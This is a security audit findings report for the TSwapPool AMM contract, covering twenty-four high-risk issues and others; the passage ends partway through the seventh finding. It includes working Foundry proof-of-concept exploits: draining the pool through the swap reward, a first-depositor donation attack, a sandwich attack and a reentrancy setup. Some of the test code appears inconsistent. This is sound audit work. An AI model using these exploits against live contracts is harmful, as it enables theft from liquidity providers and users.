# 5 t swap audit - Findings Report
## Commit hash: 55d1e086ed0917fd055b14f63099c2342eb6b86a

## Protocol Overview 

**TSwap Protocol**

- Decentralized exchange (DEX) built as an Automated Market Maker for any ERC-20 ↔ WETH pair.  
- `PoolFactory` deploys one `TSwapPool` per token and records mappings for fast lookup, stopping duplicates.  

**Liquidity**

- Anyone can supply WETH + token in the current ratio via `deposit`.  
- Pool mints LP tokens (ERC-20) proportional to contribution; they are burned on `withdraw`, returning assets and accumulated fees.  
- First depositor must include `MINIMUM_WETH_LIQUIDITY` to bootstrap k.  

**Swaps**

- Constant-product invariant x*y=k with 0.3 % fee.  
- `swapExactInput`: user specifies amount in; `swapExactOutput`: user specifies desired amount out.  
- View helpers quote prices; `_swap` enforces invariant and counts trades—every 10th swap gives a small reward.  

**Incentives**

- LPs earn fees embedded in pool balances.  
- Trader reward after `SWAP_COUNT_MAX` (default 10) stimulates volume.  

**Security & Design**

- Solidity 0.8.20; immutable token addresses; no external price oracles.  
- Simple, predictable, gas-efficient code suitable for permissionless deployment or integration.
## High Risk Findings
[H-1]. Access Control issue in TSwapPool::_swap
[H-2]. Integer Overflow/Math issue in TSwapPool::getInputAmountBasedOnOutput
[H-3]. DOS issue in TSwapPool::_swap
[H-4]. Frontrun/Backrun/Sandwhich MEV issue in TSwapPool::swapExactOutput
[H-5]. Frontrun/Backrun/Sandwhich MEV issue in TSwapPool::_swap
[H-6]. Flash Loan Economic Manipulation issue in TSwapPool::deposit
[H-7]. Reentrancy issue in TSwapPool::_swap
[H-8]. Flash Loan Economic Manipulation issue in TSwapPool::_swap
[H-9]. Integer Overflow/Math issue in TSwapPool::_swap
[H-10]. Reentrancy issue in TSwapPool::_addLiquidityMintAndTransfer
[H-11]. Unchecked Return issue in TSwapPool::swapExactInput
[H-12]. Unchecked Return issue in TSwapPool::_addLiquidityMintAndTransfer
[H-13]. Integer Overflow/Math issue in TSwapPool::deposit
[H-14]. Integer Overflow/Math issue in TSwapPool::_addLiquidityMintAndTransfer
[H-15]. Unexpected Eth issue in TSwapPool::withdraw
[H-16]. Frontrun/Backrun/Sandwhich MEV issue in TSwapPool::deposit
[H-17]. Integer Overflow/Math issue in TSwapPool::_swap
[H-18]. Unchecked Return issue in TSwapPool::deposit, withdraw, swapExactInput, swapExactOutput
[H-19]. Integer Overflow/Math issue in TSwapPool::deposit
[H-20]. Unexpected Eth issue in TSwapPool::_addLiquidityMintAndTransfer
[H-21]. DOS issue in TSwapPool::_swap
[H-22]. Unchecked Return issue in TSwapPool::_swap, _addLiquidityMintAndTransfer, withdraw
[H-23]. Unchecked Return issue in TSwapPool::_swap
[H-24]. Flash Loan Economic Manipulation issue in TSwapPool::_swap
## Medium Risk Findings
[M-1]. DOS issue in TSwapPool::sellPoolTokens
[M-2]. Integer Overflow issue in TSwapPool::getOutputAmountBasedOnInput
[M-3]. Integer Overflow issue in TSwapPool::getInputAmountBasedOnOutput
[M-4]. Frontrun/Backrun/Sandwhich MEV issue in TSwapPool::sellPoolTokens
[M-5]. Integer Overflow/Math issue in TSwapPool::getInputAmountBasedOnOutput
[M-6]. DOS issue in TSwapPool::_swap
[M-7]. Unchecked Return issue in TSwapPool::withdraw
[M-8]. Integer Overflow/Math issue in TSwapPool::getOutputAmountBasedOnInput
## Low Risk Findings
[L-1]. Integer Overflow/Math issue in TSwapPool::getOutputAmountBasedOnInput
[L-2]. Zero Code issue in TSwapPool::constructor
[L-3]. Event Consistency issue in TSwapPool::swapExactInput
[L-4]. Integer Overflow issue in TSwapPool::getOutputAmountBasedOnInput
[L-5]. Integer Overflow/Math issue in TSwapPool::_swap
[L-6]. Reentrancy issue in TSwapPool::_swap
[L-7]. Frontrun/Backrun/Sandwhich MEV issue in TSwapPool::_swap
[L-8]. Integer Overflow issue in TSwapPool::getInputAmountBasedOnOutput
[L-9]. Unexpected Eth issue in TSwapPool::NA
[L-10]. Event Consistency issue in TSwapPool::withdraw, swapExactInput, swapExactOutput
[L-11]. Unexpected Eth issue in TSwapPool::receive
[L-12]. Zero Code issue in TSwapPool::constructor
## Info Risk Findings
[I-1]. Pragma issue in TSwapPool::NA
[I-2]. Event Consistency issue in TSwapPool::_swap
[I-3]. Pragma issue in PoolFactory::NA
[I-4]. Reentrancy issue in TSwapPool::deposit
[I-5]. Integer Overflow/Math issue in TSwapPool::deposit
[I-6]. Pausable Emergency Stop issue in TSwapPool::deposit, withdraw, swapExactInput, swapExactOutput
[I-7]. Frontrun/Backrun/Sandwhich MEV issue in TSwapPool::deposit
[I-8]. Zero Code issue in PoolFactory::createPool
[I-9]. Event Consistency issue in TSwapPool::_swap
[I-10]. DOS issue in TSwapPool::_addLiquidityMintAndTransfer


### Number of Findings
- H: 24
- M: 8
- L: 12
- I: 10



# High Risk Findings

## [H-1]. Access Control issue in TSwapPool::_swap

## Description
The `_swap` function contains a flawed reward mechanism that transfers 1 ether of the `outputToken` to the user on every 10th swap. The tokens are taken directly from the pool's reserves, which belong to the liquidity providers. This allows an attacker to systematically drain funds from the pool by executing a series of low-cost swaps.

Vulnerable Code Snippet in `TSwapPool.sol`:
```solidity
function _swap(
    IERC20 inputToken,
    uint256 inputAmount,
    IERC20 outputToken,
    uint256 outputAmount
) private {
    // ...
    swap_count++;
    if (swap_count >= SWAP_COUNT_MAX) { // SWAP_COUNT_MAX is 10
        swap_count = 0;
        outputToken.safeTransfer(msg.sender, 1 ether); // Drains 1e18 of the output token
    }
    // ...
}
```

## Impact
An attacker can perform 9 minimal swaps followed by a 10th swap to trigger the flawed reward, stealing 1 ether of the output token from the liquidity providers. This can be repeated to drain a significant portion of the pool's assets, leading to direct financial loss for LPs. The cost of performing the swaps can be much lower than the value of the stolen assets.

## Proof of Concept
1. A Liquidity Provider adds 1000 WETH and 1000 PoolToken to the pool.
2. An attacker approves the pool to spend a small amount of their WETH.
3. The attacker executes `swapExactInput` 9 times, swapping 1 wei of WETH for PoolToken each time, incrementing `swap_count` to 9.
4. The attacker executes the 10th swap. `swap_count` becomes 10, triggering the `if` block.
5. The contract transfers 1 ether of PoolToken to the attacker, in addition to the regular swap output.
6. The attacker has successfully stolen 1 PoolToken from the LPs' funds. This process can be repeated.

## Proof of Code
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test, console} from "forge-std/Test.sol";
import {TSwapPool} from "../src/TSwapPool.sol";
import {MockERC20} from "./mocks/MockERC20.sol";

contract ExploitSwapRewardTest is Test {
    TSwapPool pool;
    MockERC20 weth;
    MockERC20 poolToken;

    address lp = makeAddr("lp");
    address attacker = makeAddr("attacker");

    uint256 constant SWAP_COUNT_MAX = 10;

    function setUp() public {
        weth = new MockERC20("Wrapped Ether", "WETH", 18);
        poolToken = new MockERC20("Pool Token", "PTKN", 18);

        pool = new TSwapPool(
            address(weth),
            address(poolToken),
            "LP Token",
            "LPT"
        );

        // LP provides liquidity
        weth.mint(lp, 1000 ether);
        poolToken.mint(lp, 1000 ether);

        vm.startPrank(lp);
        weth.approve(address(pool), 1000 ether);
        poolToken.approve(address(pool), 1000 ether);
        pool.deposit(1000 ether, 1000 ether, 1000 ether, uint64(block.timestamp + 100));
        vm.stopPrank();

        // Attacker gets some WETH to perform swaps
        weth.mint(attacker, 1 ether);
        vm.startPrank(attacker);
        weth.approve(address(pool), 1 ether);
        vm.stopPrank();
    }

    function test_ExploitSwapReward() public {
        uint256 attackerPoolTokenBalanceBefore = poolToken.balanceOf(attacker);
        uint256 poolTokenReserveBefore = poolToken.balanceOf(address(pool));

        console.log("Attacker PTKN balance before exploit:", attackerPoolTokenBalanceBefore);
        console.log("Pool PTKN reserve before exploit:", poolTokenReserveBefore);

        vm.startPrank(attacker);
        // Attacker performs 9 small swaps
        for (uint256 i = 0; i < SWAP_COUNT_MAX - 1; i++) {
            pool.swapExactInput(address(weth), 1, address(poolToken), 0, uint64(block.timestamp + 100));
        }

        // The 10th swap triggers the vulnerability
        pool.swapExactInput(address(weth), 1, address(poolToken), 0, uint64(block.timestamp + 100));
        vm.stopPrank();

        uint256 attackerPoolTokenBalanceAfter = poolToken.balanceOf(attacker);
        uint256 poolTokenReserveAfter = poolToken.balanceOf(address(pool));

        console.log("Attacker PTKN balance after exploit:", attackerPoolTokenBalanceAfter);
        console.log("Pool PTKN reserve after exploit:", poolTokenReserveAfter);

        // Attacker's balance should be increased by 1 ether + small swap amounts
        // We check if it increased by at least 1 ether, ignoring the tiny swap outputs.
        assertGe(attackerPoolTokenBalanceAfter - attackerPoolTokenBalanceBefore, 1 ether);
        
        // Pool reserve is drained by 1 ether + tiny swap amounts
        // Check that the reserve has been drained by at least 1 ether.
        assertGe(poolTokenReserveBefore - poolTokenReserveAfter, 1 ether);
    }
}
```

## Suggested Mitigation
The reward logic is fundamentally flawed as it gives away LP assets. This feature should be removed entirely. If a reward mechanism is desired, it should be funded from a separate treasury or protocol fees, not from the liquidity provider's capital.

```diff
-    swap_count++;
-    if (swap_count >= SWAP_COUNT_MAX) {
-        swap_count = 0;
-        outputToken.safeTransfer(msg.sender, 1 ether);
-    }
```

## [H-2]. Integer Overflow/Math issue in TSwapPool::getInputAmountBasedOnOutput

## Description
The function `getInputAmountBasedOnOutput` incorrectly calculates the required input amount for a desired output. The formula uses a multiplication factor of `10000` where it should be `1000` to correctly account for the protocol's 0.3% fee (997/1000). The correct formula to derive the required input from a desired output is `inputAmount = (inputReserves * outputAmount * 1000) / ((outputReserves - outputAmount) * 997)`. The implemented formula results in a required input amount that is 10 times larger than it should be.

## Impact
This bug breaks the core functionality of `swapExactOutput` and `sellPoolTokens`, which rely on this calculation. Users attempting to use these functions will have their transactions systematically revert because the contract will attempt to pull 10x the required tokens, failing the `safeTransferFrom` call. If a user has pre-approved a sufficient amount, they will suffer a significant financial loss, overpaying for their swap by a factor of 10. This renders a major feature of the protocol unusable and dangerous.

## Proof of Concept
1. A user wants to receive exactly 10 WETH (`outputAmount`) by swapping their `poolToken`.
2. They call `swapExactOutput`, which internally calls `getInputAmountBasedOnOutput`.
3. Assume the pool has 1000 `poolToken` (`inputReserves`) and 1000 WETH (`outputReserves`).
4. The buggy function calculates the required `inputAmount` as `((1000 * 10) * 10000) / ((1000 - 10) * 997)`, which is approximately 101.31 `poolToken`.
5. The correct amount should be `((1000 * 10) * 1000) / ((1000 - 10) * 997)`, which is approximately 10.13 `poolToken`.
6. The user is asked to provide 10x more tokens than necessary, causing the transaction to fail or the user to lose significant funds.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import "forge-std/Test.sol";
import "src/TSwapPool.sol";
import "test/mocks/MockERC20.sol";

contract TSwapPoolMathTest is Test {
    TSwapPool public tSwapPool;
    MockERC20 public wethToken;
    MockERC20 public poolToken;

    function setUp() public {
        wethToken = new MockERC20("WETH", "WETH", 18);
        poolToken = new MockERC20("Pool Token", "PT", 18);

        tSwapPool = new TSwapPool(
            address(wethToken),
            address(poolToken),
            "LP Token",
            "LPT"
        );

        // Mint tokens to this contract
        wethToken.mint(address(this), 1_000 ether);
        poolToken.mint(address(this), 1_000 ether);

        // Approve pool so it can pull the liquidity
        wethToken.approve(address(tSwapPool), type(uint256).max);
        poolToken.approve(address(tSwapPool), type(uint256).max);

        // Seed the pool with liquidity so reserves are non-zero
        tSwapPool.deposit(
            1_000 ether, // wethToDeposit
            1_000 ether, // maximumPoolTokensToDeposit
            0,           // minimumLiquidityTokensToMint
            uint64(block.timestamp + 1)
        );
    }

    function test_getInputAmountBasedOnOutput_isOverpricedBy10x() public {
        uint256 outputAmount = 10 ether;
        uint256 inputReserves = poolToken.balanceOf(address(tSwapPool));
        uint256 outputReserves = wethToken.balanceOf(address(tSwapPool));

        uint256 buggyInput = tSwapPool.getInputAmountBasedOnOutput(
            outputAmount,
            inputReserves,
            outputReserves
        );

        uint256 correctInput = (inputReserves * outputAmount * 1000) /
            ((outputReserves - outputAmount) * 997);

        // Buggy result is ~10× the correct value
        assertApproxEqAbs(buggyInput, correctInput * 10, 1 wei);
        assertGt(buggyInput, correctInput);
    }
}

## Suggested Mitigation
The multiplication factor in the numerator should be corrected from `10000` to `1000` to reflect the correct fee calculation.
```solidity
// src/TSwapPool.sol:164
function getInputAmountBasedOnOutput(
    uint256 outputAmount,
    uint256 inputReserves,
    uint256 outputReserves
) public pure revertIfZero(outputAmount) revertIfZero(outputReserves) returns (uint256 inputAmount) {
    // Fix: Change 10000 to 1000
    return ((inputReserves * outputAmount) * 1000) / ((outputReserves - outputAmount) * 997);
}
```

## [H-3]. DOS issue in TSwapPool::_swap

## Description
The private `_swap` function contains a 'reward' mechanism that transfers an additional 1 ether of the `outputToken` to the swapper on every 10th swap (`SWAP_COUNT_MAX`). This feature can be exploited to drain funds from the pool and can also lead to a Denial-of-Service (DoS) condition.

## Impact
1. **Theft of LP Funds**: An attacker can monitor the public `swap_count` variable. By executing 9 low-cost swaps, they can position themselves to perform the 10th swap, choosing a valuable token like WETH as the output. They will receive the normal swap output plus a 'free' 1 WETH, directly stealing from the liquidity providers.
2. **Denial of Service**: If a user's 10th swap is for an `outputToken` where the pool's balance is less than 1 ether, the bonus `safeTransfer` call will revert, causing the entire swap transaction to fail. An attacker could intentionally trigger swaps for low-liquidity tokens to block legitimate swaps, making the pool unusable at critical moments.

## Proof of Concept
1. An attacker observes `swap_count` is 9.
2. The attacker executes a swap, e.g., `swapExactInput(poolToken, 1 wei, wethToken, 0, deadline)`.
3. The `_swap` function is called. `swap_count` increments to 10.
4. The `if (swap_count >= SWAP_COUNT_MAX)` condition becomes true.
5. `swap_count` is reset to 0, and the line `outputToken.safeTransfer(msg.sender, 1 ether)` is executed.
6. The attacker receives their tiny swap output plus a bonus of 1 full WETH, draining value from the pool's LPs.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import "forge-std/Test.sol";
import "src/TSwapPool.sol";
import "test/mocks/MockERC20.sol";

contract TSwapPoolBackdoorTest is Test {
    TSwapPool public tSwapPool;
    MockERC20 public wethToken;
    MockERC20 public poolToken;

    address public constant ATTACKER = address(0x42);

    function setUp() public {
        wethToken = new MockERC20("WETH", "WETH", 18);
        poolToken = new MockERC20("Pool Token", "PT", 18);

        tSwapPool = new TSwapPool(
            address(wethToken),
            address(poolToken),
            "LP Token",
            "LPT"
        );

        // Provide initial liquidity
        wethToken.mint(address(this), 100 ether);
        poolToken.mint(address(this), 10_000 ether);
        tSwapPool.deposit(100 ether, 10_000 ether, 1, uint64(block.timestamp + 1));

        // Give attacker some pool-tokens to trade with
        poolToken.mint(ATTACKER, 10 ether);
        vm.prank(ATTACKER);
        poolToken.approve(address(tSwapPool), type(uint256).max);
    }

    function test_drainWithReward() public {
        vm.startPrank(ATTACKER);

        // Perform 9 tiny swaps to reach the threshold
        for (uint256 i = 0; i < 9; i++) {
            tSwapPool.swapExactInput(
                IERC20(address(poolToken)),
                1,                        // 1 wei of PT
                IERC20(address(wethToken)),
                0,                        // no minimum out
                uint64(block.timestamp + 1)
            );
        }

        uint256 wethBefore = wethToken.balanceOf(ATTACKER);

        // 10th swap triggers the 1 WETH bonus
        uint256 normalOut = tSwapPool.swapExactInput(
            IERC20(address(poolToken)),
            1,
            IERC20(address(wethToken)),
            0,
            uint64(block.timestamp + 1)
        );

        uint256 wethAfter = wethToken.balanceOf(ATTACKER);

        assertEq(
            wethAfter,
            wethBefore + normalOut + 1 ether,
            "Attacker should receive the 1 ether bonus"
        );
    }
}

## Suggested Mitigation
This 'reward' feature is fundamentally insecure and provides a clear vector for theft and denial-of-service. It should be removed entirely from the `_swap` function.
```solidity
// src/TSwapPool.sol:218
// ...
// REMOVE THE ENTIRE IF BLOCK
// swap_count++;
// if (swap_count >= SWAP_COUNT_MAX) {
//     swap_count = 0;
//     outputToken.safeTransfer(msg.sender, 1 ether);
// }

emit Swap(msg.sender, inputToken, inputAmount, outputToken, outputAmount);

inputToken.safeTransferFrom(msg.sender, address(this), inputAmount);
outputToken.safeTransfer(msg.sender, outputAmount);
// ...
```

## [H-4]. Frontrun/Backrun/Sandwhich MEV issue in TSwapPool::swapExactOutput

## Description
The `swapExactOutput` function allows a user to specify a desired amount of output tokens, and the contract calculates the required input amount. However, it lacks a mechanism for the user to specify the maximum amount of input tokens they are willing to pay. This exposes the user to front-running (sandwich) attacks. An MEV bot can see the transaction in the mempool, manipulate the pool's price to inflate the required input amount, and cause the user to pay a much higher price, as long as the amount is within the user's token allowance for the pool contract.

## Impact
Users are at risk of significant financial loss. An attacker can force a user to overpay for tokens, extracting value from their trade. This makes the `swapExactOutput` function and any function that relies on it (such as `sellPoolTokens`) fundamentally unsafe for users.

## Proof of Concept
1. Alice wants exactly 10 pool-tokens and observes an off-chain price of 1 pool-token = 1 WETH (the pool initially holds 100 WETH and 100 TKN).
2. Alice approves the pool to pull up to 20 WETH and submits `swapExactOutput(WETH,TKN,10)`.
3. An MEV bot sees the tx in the mem-pool and first sends a transaction that swaps 20 WETH for TKN through the same pool (front-run).
4. Reserves become 120 WETH / 83.06 TKN (0.3 % fee). Pool price is now ≈ 1.44 WETH per TKN.
5. Alice’s transaction is mined next; the contract recomputes the amountIn and pulls 14.47 WETH from Alice (≤ 20 WETH allowance, so it succeeds).
6. The bot back-runs, selling the TKN back for ≈ 20 WETH, pocketing the difference. Alice overpaid ≈ 4.47 WETH.
7. The attack can be repeated and the loss is limited only by Alice’s allowance, hence unbounded.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import {TSwapPool} from "src/TSwapPool.sol";
import {MockERC20} from "test/mocks/MockERC20.sol";

contract SandwichAttackTest is Test {
    TSwapPool pool;
    MockERC20 weth;
    MockERC20 token;

    address victim   = address(0xABC);
    address attacker = address(0xBAD);

    function setUp() public {
        // deploy mock tokens
        weth  = new MockERC20("Wrapped Ether", "WETH", 18);
        token = new MockERC20("Pool Token", "TKN", 18);

        // IMPORTANT: constructor takes (poolToken, wethToken, name, symbol)
        pool = new TSwapPool(address(token), address(weth), "LP-Token", "LPT");

        // provide initial liquidity (100 WETH : 100 TKN)
        weth.mint(address(this), 100 ether);
        token.mint(address(this), 100 ether);
        weth.approve(address(pool), 100 ether);
        token.approve(address(pool), 100 ether);
        pool.deposit(100 ether, 100 ether, 100 ether, uint64(block.timestamp));

        // fund attacker & victim
        weth.mint(victim,   20 ether);
        weth.mint(attacker, 40 ether);

        vm.prank(victim);
        weth.approve(address(pool), 20 ether);
        vm.prank(attacker);
        weth.approve(address(pool), 40 ether);
    }

    function test_sandwichAttackIncreasesVictimCost() public {
        uint256 victimDesiredOut = 10 ether; // 10 TKN
        uint256 victimWethBefore = weth.balanceOf(victim);

        // attacker front-runs, pushing price up
        vm.prank(attacker);
        pool.swapExactInput(address(weth), 20 ether, address(token), 0, uint64(block.timestamp));

        // victim tx is mined
        vm.prank(victim);
        pool.swapExactOutput(address(weth), address(token), victimDesiredOut, uint64(block.timestamp));

        uint256 victimWethAfter = weth.balanceOf(victim);
        uint256 spent = victimWethBefore - victimWethAfter;

        // in a fair 1:1 market victim would spend 10 WETH, after sandwich it is higher
        assertGt(spent, 10 ether);
    }
}

## Suggested Mitigation
Add a `maxInputAmount` parameter to the `swapExactOutput` function. This parameter allows the user to define a slippage tolerance by setting the absolute maximum input they are willing to provide. The function must then verify that the calculated input does not exceed this user-defined limit.

```diff
- function swapExactOutput(IERC20 inputToken, IERC20 outputToken, uint256 outputAmount, uint64 deadline) 
-   public returns (uint256 inputAmount)
+ function swapExactOutput(IERC20 inputToken, IERC20 outputToken, uint256 outputAmount, uint256 maxInputAmount, uint64 deadline)
+   public returns (uint256 inputAmount)
  {
      // ...
      inputAmount = getInputAmountBasedOnOutput(outputAmount, inputReserves, outputReserves);
+     require(inputAmount <= maxInputAmount, "TSwapPool: Excessive input amount");
      _swap(inputToken, inputAmount, outputToken, outputAmount);
  }
```

## [H-5]. Frontrun/Backrun/Sandwhich MEV issue in TSwapPool::_swap

## Description
The `_swap` function includes a reward mechanism where every 10th swap (`SWAP_COUNT_MAX`), the swapper receives a fixed reward of `1 ether` (1e18) of the `outputToken`. The `swap_count` state variable is public, making the reward predictable. Malicious actors or MEV bots can monitor this variable and, when it reaches 9, front-run any legitimate user's transaction to claim the reward for themselves. This undermines the incentive system and directs protocol funds to attackers.

## Impact
Because the pool transfers a fixed 1 * 10^18 units of `outputToken` every time `swap_count` reaches `SWAP_COUNT_MAX`, an attacker can repeatedly call `swapExactInput` ten times with dust amounts (≥1 wei) to reset the counter and immediately receive the reward again. The attacker’s cost is only the gas fee plus the tiny swap inputs, while the reward (1 full token) is taken directly from the pool’s reserves, irreversibly skewing the x*y=k invariant and draining liquidity. This can be looped until the pool is emptied, making the vulnerability economically catastrophic.

## Proof of Concept
1. Attacker approves the pool for 10 wei of WETH (or pool token).
2. For i = 0..9 attacker calls `swapExactInput` with `inputAmount = 1 wei` and `minOutput = 0`.
3. On the 10th call the contract transfers `1e18` units of `outputToken` to the attacker and resets `swap_count`.
4. Repeat steps 2-3 until reserves are exhausted.

Economic result: spend 10 wei per cycle, receive 1 token per cycle ⇒ near-zero cost unlimited drain.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import "forge-std/Test.sol";
import "src/TSwapPool.sol";
import "test/mocks/MockERC20.sol";

contract RewardDrainTest is Test {
    TSwapPool pool;
    MockERC20 weth;
    MockERC20 tokenA;
    address attacker = address(0xA11);

    function setUp() public {
        weth   = new MockERC20("WETH","WETH",18);
        tokenA = new MockERC20("TKA","TKA",18);
        pool   = new TSwapPool(address(weth), address(tokenA), "LP","LP");

        // seed pool with liquidity held by deployer
        weth.mint(address(this), 100 ether);
        tokenA.mint(address(this), 100 ether);
        weth.approve(address(pool), 100 ether);
        tokenA.approve(address(pool), 100 ether);
        pool.deposit(100 ether, 100 ether, 1, uint64(block.timestamp));

        // fund attacker with tiny amount of input token
        weth.mint(attacker, 1 ether);
    }

    function testDrainOneCycle() public {
        uint256 attackerBalBefore = tokenA.balanceOf(attacker);
        vm.startPrank(attacker);
        weth.approve(address(pool), 1 ether);
        for (uint i = 0; i < 10; i++) {
            pool.swapExactInput(IERC20(address(weth)), 1 wei, IERC20(address(tokenA)), 0, uint64(block.timestamp));
        }
        vm.stopPrank();
        uint256 attackerBalAfter = tokenA.balanceOf(attacker);
        // attacker should have received at least the 1-token reward
        assertEq(attackerBalAfter - attackerBalBefore, 1 ether);
    }
}

## Suggested Mitigation
Remove the reward logic or issue rewards from an external, pre-funded incentive contract instead of the pool’s reserves. If rewards must stay inside `_swap`, make them unpredictable (e.g., block-hash entropy) and proportional to swap volume, and always mint new incentive tokens rather than transferring existing pool reserves.

## [H-6]. Flash Loan Economic Manipulation issue in TSwapPool::deposit

## Description
The pool is vulnerable to an attack by the first liquidity provider. When the first LP calls `deposit`, the number of LP tokens they receive is directly proportional to the `wethToDeposit`. The contract mints `wethToDeposit` LP tokens. This mechanism can be exploited:
1. An attacker provides a tiny amount of liquidity (e.g., 1 Gwei of WETH and 1 wei of PoolToken), establishing a pool at minimal cost and receiving a small number of LP tokens.
2. The attacker then 'donates' a large number of tokens to the pool by transferring them directly to the contract address. This massively increases the reserves without minting new LP tokens.
3. The value of the attacker's initial LP tokens is now extremely high relative to the total supply.
4. When a subsequent, honest user provides liquidity, they will receive a disproportionately small number of LP tokens for their deposit, as their contribution is measured against the now-inflated reserves.
5. The attacker can then withdraw their liquidity, claiming a large percentage of the pool's assets, including the victim's deposited funds.

## Impact
This vulnerability allows the first liquidity provider to steal a significant portion of the funds from subsequent liquidity providers. It undermines the fairness of the pool and can lead to substantial financial loss for users, destroying trust in the protocol.

## Proof of Concept
1. Attacker calls `deposit` with the minimum required WETH (`1 Gwei`) and a similarly tiny amount of `PoolToken` (e.g., `1 wei`). They receive `1 Gwei` of LP tokens.
2. The pool now has `1 Gwei` of WETH and `1 wei` of `PoolToken`. The attacker holds 100% of the LP tokens.
3. Attacker transfers 100 WETH directly to the pool contract address. The reserves are now `100 WETH + 1 Gwei` and `1 wei PoolToken`.
4. A victim, Bob, decides to add 10 WETH of liquidity. The pool calculates that he needs to add a near-zero amount of `PoolToken` due to the skewed ratio. Bob deposits his 10 WETH.
5. Bob receives a very small amount of LP tokens because his deposit is small compared to the total (donated) reserves, while the `totalLiquidityTokenSupply` is still tiny. For example: `liquidityTokensToMint = (10 WETH * 1 Gwei) / (100 WETH) = 0.1 Gwei` LP tokens.
6. The attacker now owns `1 Gwei / (1 Gwei + 0.1 Gwei)` which is ~91% of the pool. The pool contains the attacker's initial deposit, the attacker's donation (100 WETH), and Bob's deposit (10 WETH).
7. The attacker withdraws their ~91% share, receiving back their donated funds plus ~9.1 of Bob's 10 WETH.

## Proof of Code
```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import {Test, console} from "forge-std/Test.sol";
import {TSwapPool} from "../src/TSwapPool.sol";
import {MockERC20} from "./mocks/MockERC20.sol";

contract FirstLPAttackTest is Test {
    TSwapPool private pool;
    MockERC20 private weth;
    MockERC20 private token;
    address private constant ATTACKER = address(0x1);
    address private constant VICTIM = address(0x2);
    uint256 private constant MINIMUM_WETH_LIQUIDITY = 1e9; // 1 Gwei

    function setUp() public {
        weth = new MockERC20("WETH", "WETH");
        token = new MockERC20("Token", "TKN");
        pool = new TSwapPool(address(weth), address(token), "LP", "LP");

        weth.mint(ATTACKER, 1000e18);
        token.mint(ATTACKER, 1000e18);
        weth.mint(VICTIM, 100e18);
        token.mint(VICTIM, 100e18);
    }

    function testFirstLiquidityProviderAttack() public {
        // 1. Attacker provides tiny initial liquidity
        vm.startPrank(ATTACKER);
        weth.approve(address(pool), type(uint256).max);
        token.approve(address(pool), type(uint256).max);
        // Deposit minimum WETH and 1 wei of token
        pool.deposit(MINIMUM_WETH_LIQUIDITY, 1, 0, uint64(block.timestamp));
        vm.stopPrank();

        uint256 attackerLpBalance = pool.balanceOf(ATTACKER);
        assertEq(attackerLpBalance, MINIMUM_WETH_LIQUIDITY);
        assertEq(pool.totalSupply(), MINIMUM_WETH_LIQUIDITY);

        // 2. Attacker donates a large amount of WETH to skew the pool
        weth.transfer(address(pool), 100e18);

        // 3. Victim adds significant liquidity
        vm.startPrank(VICTIM);
        weth.approve(address(pool), 10e18);
        token.approve(address(pool), 10e18);
        uint256 poolTokensToDeposit = pool.getPoolTokensToDepositBasedOnWeth(10e18);
        pool.deposit(10e18, poolTokensToDeposit, 0, uint64(block.timestamp));
        vm.stopPrank();

        uint256 victimLpBalance = pool.balanceOf(VICTIM);
        console.log("Attacker LP tokens:", attackerLpBalance);
        console.log("Victim LP tokens:", victimLpBalance);

        // Victim gets very few LP tokens compared to the attacker
        assertTrue(attackerLpBalance > victimLpBalance);

        // 4. Attacker withdraws their share, taking a large portion of the victim's funds
        uint256 victimWethBalanceBefore = weth.balanceOf(VICTIM);
        uint256 attackerWethBalanceBefore = weth.balanceOf(ATTACKER);

        vm.startPrank(ATTACKER);
        pool.withdraw(attackerLpBalance, 0, 0, uint64(block.timestamp));
        vm.stopPrank();

        uint256 attackerWethBalanceAfter = weth.balanceOf(ATTACKER);

        // Attacker started with 1000 WETH, deposited a tiny bit, donated 100, and ended up with more than 990 WETH + their share of victim's deposit
        // The attacker profits from the victim's deposit
        console.log("Attacker WETH profit from victim:", (attackerWethBalanceAfter - (attackerWethBalanceBefore - 100e18)));
        assertTrue(attackerWethBalanceAfter > attackerWethBalanceBefore - 100e18 + 9e18, "Attacker should profit >9 WETH from victim's 10 WETH");
    }
}
```

## Suggested Mitigation
1) Keep two storage variables `reserveWeth` and `reserveToken` that are updated only inside deposit/withdraw/swap functions (similar to Uniswap-V2).
2) Compute liquidity minted as:
   • First deposit: `liquidity = sqrt(wethIn * tokenIn) - MINIMUM_LIQUIDITY; _mint(address(0), MINIMUM_LIQUIDITY);`
   • Later deposits: `liquidity = min(wethIn * totalSupply / reserveWeth, tokenIn * totalSupply / reserveToken);`
3) After every state-changing action, update `reserveWeth` and `reserveToken` with the new balances (`_update(uint112 newReserveWeth, uint112 newReserveToken)`).
4) NEVER derive reserves from `IERC20.balanceOf` inside business logic; external transfers will not influence minting until someone explicitly calls `sync`, making the donation attack economically pointless.

## [H-7]. Reentrancy issue in TSwapPool::_swap

## Description
The contract is vulnerable to a reentrancy attack because it uses external calls to `balanceOf` to determine its internal state (reserves) before performing token transfers. An attacker can use a malicious token contract (e.g., ERC777-like) with a callback hook in its `transferFrom` function. This hook allows a re-entrant call into the `TSwapPool` after the attacker's tokens have been transferred to the pool but before the pool sends the output tokens. The re-entrant call will read inflated reserves for the malicious token, leading to an incorrect and advantageous calculation of the output amount, allowing the attacker to drain funds from the pool.

## Impact
A malicious actor can create a pool with a crafted ERC20 token that supports re-entrancy hooks. By executing a swap, they can re-enter the contract and drain the paired asset (e.g., WETH) from the pool, leading to a complete loss of liquidity for that asset provided by other users.

## Proof of Concept
Deploy a malicious ERC20 that calls back into the pool during its transferFrom. In the callback execute a second swap while the first one is still in progress. Because the pool already received the input tokens but has not yet sent out the output tokens, the second swap observes inflated input-token reserves and unchanged output-token reserves, letting the attacker obtain an outsized amount of WETH. After the first call resumes, the attacker receives the normal output as well, ending up with more WETH than the invariant allows and draining honest LPs.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import {Test, console} from "forge-std/Test.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {TSwapPool} from "../../src/TSwapPool.sol";

/* ───────────────────────────────── Mocks ───────────────────────────────── */
contract MockERC20 is ERC20 {
    constructor(string memory n, string memory s) ERC20(n, s) {}
